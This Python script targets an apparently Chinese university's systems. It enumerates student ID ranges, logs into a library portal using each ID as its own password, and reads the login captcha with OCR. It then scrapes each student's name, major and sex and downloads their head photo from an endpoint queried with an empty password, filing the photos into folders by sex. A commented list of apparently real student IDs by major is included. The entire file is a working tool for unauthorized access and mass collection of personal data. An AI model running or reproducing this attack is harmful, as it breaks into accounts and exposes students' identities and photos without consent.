import requests
import os
import pytesseract
from http import cookiejar
from PIL import Image
from bs4 import BeautifulSoup
import time
from multiprocessing import Pool


headers = {
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3',
    'Accept-Encoding': 'gzip, deflate',
    'Accept-Language': 'zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7,ko-KR;q=0.6,ko;q=0.5,ja-JP;q=0.4,ja;q=0.3',
    'Cache-Control': 'max-age=0',
    'Connection': 'keep-alive',
    'Upgrade-Insecure-Requests': '1',
    'User-Agent': 'Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.131 Mobile Safari/537.36'
    }

path = os.path.abspath('.')
Imgurl = "http:xxxxxxxx.edu.cn/xxxxxxxxxxx/getHeadImg"
# 打开session。
session = requests.Session()
# 保存cookies
session.cookies = cookiejar.LWPCookieJar(filename='cookies')
try:
    # session加载cookies
    session.cookies.load(ignore_discard=True)
except:
    print("Cookie 未能加载")

# 验证码识别

def getCaptcha():
    captcha_url = "http://202.1xxx6.13.8/xxxxx/captcha.php"
    x = 0
    bin = session.get(captcha_url, headers=headers).content
    with open("C:\\Users\\zelig\\Desktop\\finalcode\\%s.jpg" % x, "wb")as file:
        file.write(bin)
    image = Image.open("C:\\Users\\zelig\\Desktop\\finalcode\\0.jpg")
    code = pytesseract.image_to_string(image)
    return code


# 登录并获取页面信息
def getInfo(xuehao):
    from_data = {
        'number': str(xuehao),
        'passwd': str(xuehao),
        'captcha': getCaptcha(),
        'select': 'cert_no',
        'returnUrl': '',
    }
    session.post("http://2xxxxxxxx/redr_verify.php", data=from_data, headers=headers)
    info = session.get("http://202.xxxxxxxx/eader/redr_info_rule.php",headers=headers)
    soup = BeautifulSoup(info.text, "lxml")
    if soup.find('div', {'id': 'mylib_info'}):
        mylib_info = soup.findAll("td")
        name = mylib_info[1].get_text().split("：")[1]
        major = mylib_info[19].get_text().split("：")[1]
        sex = mylib_info[21].get_text().split("：")[1]

        print("Get {} info!".format(xuehao))
        return [major, name, sex]
    return ["null","null", "null"]

    

def getImg(id, dirs):
    query_string = {
        'memberId': str(id),
        'pwd': ''
    }
    rep = requests.post(Imgurl, headers=headers, data=query_string)
    try:
        rep.headers['Transfer-Encoding']
        info = getInfo(id)
        creatDir = os.path.join(os.path.join(path, dirs), info[2])
        if info[2]=='女':
            with open("{}/{}.jpg".format(creatDir, str(info[0])+"_"+str(info[1])+"_"+str(id)),'wb') as file:
                file.write(rep.content)
        elif info[2]=='男':
            with open("{}/{}.jpg".format(creatDir, str(info[0])+"_"+str(info[1])+"_"+str(id)),'wb') as file:
                file.write(rep.content)
        elif info[2]=='null':
            with open("{}/{}.jpg".format(creatDir, str(info[0])+"_"+str(info[1])+"_"+str(id)),'wb') as file:
                file.write(rep.content)
    except:
        print("No Image!")
   


if __name__ == "__main__":
    data = {
        # "高分子材料与工程": "541702030155",
        # "化学工程与工艺(精细化工)": "541704070102",
        # "环境工程": "541604050102",
        # "新能源材料与器件": "541704100101",
        # "应用化学": "541404080160",
        # "电气工程及其自动化": "541701020101",
        # "轨道交通信号与控制": "541701070102",
        # "智能电网信息工程": "541701060108",
        # "自动化": "541701010107",
        # "电子信息工程": "541702010223",
        # "IEC产品设计": "541712270114",
        # "IEC信息工程": "541712250118",
        # "IEC电气工程": "541712260106",
        # "IEC电子商务": "541712030104",
        # "IEC国际商务": "541712280104",
        # "IEC环境设计": "541712270819",
        # "IEC计算机科学与技术(互联网科学与技术)": "541712010101",
        # "IEC数字媒体艺术": "541712270103",
        # "测控技术与仪器": "541702030123",
        # "车辆工程": "541702080102",
        # "机械设计制造及其自动化": "541702010111",
        # "计算机科学与技术": "541701060138",
        # "计算机科学与技术(3G软件)": "541713140103",
        # "计算机科学与技术(嵌入式软件)": "541713430109",
        # "通信工程": "541703040112",
        # "网络工程": "541704010233",
        # "物联网工程": "541703010129",
        # "建筑电气与智能化": "541401040241",
        # "建筑环境与能源应用工程": "541722070104",
        # "财务管理": "541706050139",
        # "电子商务": "541706090103",
        # "工商管理": "541703010142",
        # "会计学": "541503030111",
        # "经济学": "541706020107",
        # "市场营销": "541706050116",
        # "物流管理": "541706060101",
        # "过程装备与控制工程": "541721030103",
        # "能源与动力工程": "541721060101",
        # "软件工程": "541713460101",
        # "生物工程": "541703020106",
        # "食品科学与工程": "541703010137",
        # "食品科学与工程(烟草科学与工程)": "541702030119",
        # "食品质量与安全": "541703040121",
        # "烟草": "541703090108",
        # "朝鲜语": "541708030123",
        # "英语": "541708010111",
        # "材料物理": "541711020102",
        # "电子科学与技术": "541711010112",
        # "产品设计": "541705360106",
        # "服装与服饰设计": "541705360223",
        # "环境设计": "541705361022",
        # "视觉传达设计": "541705360203",
        # "数字媒体艺术": "541705360525",
        # "法学": "541709010111",
        # "公共事业管理": "541709050103",
        # "劳动与社会保障": "541709040115",
        # "工艺美术（陶瓷艺术）": "541705360503"
    }
    # for i, j in data.items():
    #     print("Geting {}".format(i))
    dirName = "数学"
    base = os.path.join(os.path.abspath('.'), dirName)
    os.mkdir(base)
    dirList = ['男', '女', 'null']
    for i in dirList:
        os.mkdir(os.path.join(base, i))
    number = ""
    grad = [5,6,7,8]
    clas = [1,2]
    allId = [k for i in grad for j in clas for k in range(int(number[0:3]+str(i)+number[4:7]+str(j)+number[8:10]+"01"), int(number[0:3]+str(i)+number[4:7]+str(j)+number[8:10]+"01")+60)]
    pool = Pool(4)
    for ids in allId:
        pool.apply_async(getImg, args=(ids, dirName))
    pool.close()
    pool.join()


    # for i in range(541510010101, 541510010161):
    #     getImg(Imgurl, i, "Part")
    # # getImg(Imgurl, 541510020142, "测试")